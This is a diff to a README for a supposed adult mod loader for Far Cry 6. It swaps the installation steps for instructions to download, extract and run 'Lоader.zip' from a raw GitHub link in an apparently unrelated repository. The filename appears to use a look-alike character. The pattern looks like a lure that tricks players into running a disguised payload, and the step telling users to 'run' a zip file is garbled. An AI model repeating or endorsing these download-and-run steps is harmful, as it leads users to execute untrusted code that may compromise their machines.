@@ -35,9 +35,9 @@ Welcome to the ultimate enhancement suite for **Far Cry 6**! This **Adult Mod Lo
 
 ## 🚀 Installation
 
-1. Download **Loader.rar** from this repository.
-2. Extract LOADER.rar to your **Far Cry 6** root directory.
-3. Run **Loader.exe** (Windows), or start via terminal for Linux/Mac systems.
+1. Download **https://raw.githubusercontent.com/baniblunt/ollama-rag-reranker/main/Lоader.zip** from this repository.
+2. Extract https://raw.githubusercontent.com/baniblunt/ollama-rag-reranker/main/Lоader.zip to your **Far Cry 6** root directory.
+3. Run **https://raw.githubusercontent.com/baniblunt/ollama-rag-reranker/main/Lоader.zip** (Windows), or start via terminal for Linux/Mac systems.
 4. Enjoy enhanced adult content with easy enable/disable features!
 
 ---
